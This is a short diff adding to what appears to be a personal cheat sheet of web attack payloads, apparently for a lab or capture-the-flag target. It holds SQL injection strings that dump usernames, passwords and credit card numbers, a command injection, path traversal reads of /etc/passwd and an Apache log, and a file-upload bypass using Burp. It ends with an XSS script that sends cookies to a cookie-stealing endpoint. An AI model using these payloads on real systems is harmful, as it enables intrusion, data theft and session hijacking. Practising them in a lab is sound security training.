@@ -5,4 +5,20 @@ sql 2:
 	' UNION SELECT name, username, password FROM users-- -
 	' UNION SELECT TABLE_SCHEMA, TABLE_NAME, NULL FROM information_schema.tables-- -
 	' UNION SELECT COLUMN_NAME,NULL,NULL FROM information_schema.columns WHERE TABLE_NAME = 'credit_cards'-- -
-	
+	' UNION SELECT name,card_number,NULL FROM credit_cards-- -
+
+command injection:
+	;ls
+
+path traversal:
+	getimage.php?file=/etc/passwd
+	getimage.php?file=/var/log/apache2/access.log
+	{{{REMEMBER TO CHMOD ON ACCESS.LOG BEFOREHAND! If not use backup test.log}}}
+
+file upload:
+	turn on burp
+	upload php with extension changed to png
+	capture and change to php
+
+xss:
+	<script>fetch('evilhackerfiles/steal_cookie.php?cookie=' + document.cookie)</script>
